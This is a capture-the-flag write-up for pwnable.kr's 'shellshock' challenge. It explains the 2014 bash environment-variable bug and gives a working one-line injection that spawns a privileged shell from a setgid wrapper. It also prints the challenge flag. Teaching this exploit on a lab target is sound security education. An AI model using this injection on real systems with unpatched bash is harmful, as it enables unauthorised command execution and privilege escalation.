# shellshock

## Description

shellshock - 1 pt

> Mommy, there was a shocking news about bash. <br>
> I bet you already know, but lets just make it sure :) <br> <br> <br>
> ssh shellshock@pwnable.kr -p2222 (pw:guest)

## Solution

### Background

#### Shellshock

Shellshcok is a vulnerability in the bash shell. It allows an attacker to execute arbitrary commands on the target machine. The vulnerability was discovered in 2014 and was patched in 2014. However, many systems are still vulnerable to this attack.

The bug is caused by the way bash handles environment variables. Bash will unintentionally execute commands when they are concatenated to the end of function definitions stored in the values of environment variables.

For example, in older versions of bash, the following code will print the current working directory:

```bash
$ env x='() { :;}; pwd' bash -c "echo hello"
```

### Exploit


As always, we start by examining our permissions and the available files:

```bash
$ id
uid=1019(shellshock) gid=1019(shellshock) groups=1019(shellshock)
```

```bash
$ ls -l
total 960
-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash
-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag
-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c
```

Let's take a look at the source code:

```c
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
```

This program sets the effective user and group ids of the process to the effective group id of the process. It then executes the bash shell with the command `echo shock_me`. 

Since `shellshock` has the setgid bit set, it will run with the effective group id of `shellshock_pwn`. This means that the program will run with the same permissions as the `shellshock_pwn` user.

As the title of the challenge suggests, we need to exploit the shellshock in order to get the flag. We can do this by setting an `x` environment variable to the following value:

```bash
() { :;}; bash
```

Then, running the `shellshock` program will give us a shell with permissions to read the flag:

```bash 
$ env x='() { :;}; bash' ./shellshock
$ cat flag
only if I knew CVE-2014-6271 ten years ago..!!
```